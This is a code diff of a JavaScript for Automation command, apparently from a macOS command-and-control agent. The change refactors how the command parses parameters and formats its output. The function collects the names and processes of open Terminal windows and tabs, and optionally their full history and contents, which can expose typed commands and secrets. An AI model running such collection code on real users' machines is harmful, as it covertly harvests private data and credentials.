@@ -1,40 +1,48 @@
 exports.terminals_read = function(task, command, params){
-    let split_params = params.split(" ");
-    //this means command is: terminals_read [history] [contents]
+    let split_params = {};
+    try{
+        split_params = JSON.parse(params);
+    }catch(error){
+        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+    }
     let history = false;
     let contents = false;
-    if(split_params.includes('history')){
+    if(split_params['history']){
         history = true;
     }
-    if(split_params.includes('contents')){
+    if(split_params['contents']){
         contents = true;
     }
-	var all_data = {};
+	let all_data = {};
 	try{
-		var term = Application("Terminal");
+		let term = Application("Terminal");
 		if(term.running()){
-            var windows = term.windows;
+            let windows = term.windows;
             for(let i = 0; i < windows.length; i++){
-                var win_info = "Name: " + windows[i].name() +
-                "\nVisible: " + windows[i].visible() +
-                "\nFrontmost: " + windows[i].frontmost();
-                var all_tabs = [];
+                let win_info = {
+                    "Name": windows[i].name(),
+                    "Visible": windows[i].visible(),
+                    "Frontmost": windows[i].frontmost()
+                };
+                let all_tabs = [];
                 // store the windows information in id_win in all_data
                 all_data["window_" + i] = win_info;
                 for(let j = 0; j < windows[i].tabs.length; j++){
-                    var tab_info = "Win/Tab: " + i + "/" + j +
-                    "\nBusy: " + windows[i].tabs[j].busy() +
-                    "\nProcesses: " + windows[i].tabs[j].processes() +
-                    "\nSelected: " + windows[i].tabs[j].selected() +
-                    "\nTTY: " + windows[i].tabs[j].tty();
+                    let tab_info = {
+                        "Win/Tab": + i + "/" + j,
+                        "Busy": windows[i].tabs[j].busy(),
+                        "Processes": windows[i].tabs[j].processes(),
+                        "Selected": windows[i].tabs[j].selected(),
+                        "TTY": windows[i].tabs[j].tty()
+                    };
                     if(windows[i].tabs[j].titleDisplaysCustomTitle()){
-                        tab_info += "\nCustomTitle: " + windows[i].tabs[j].customTitle();
+                        tab_info["CustomTitle"] =  windows[i].tabs[j].customTitle();
                     }
                     if(history){
-                        tab_info += "\nHistory: " + windows[i].tabs[j].history();
+                        tab_info["History"] = windows[i].tabs[j].history();
                     }
                     if(contents){
-                        tab_info += "\nContents: " + windows[i].tabs[j].contents();
+                        tab_info["Contents"] = windows[i].tabs[j].contents();
                     }
                     all_tabs.push(tab_info);
                 }
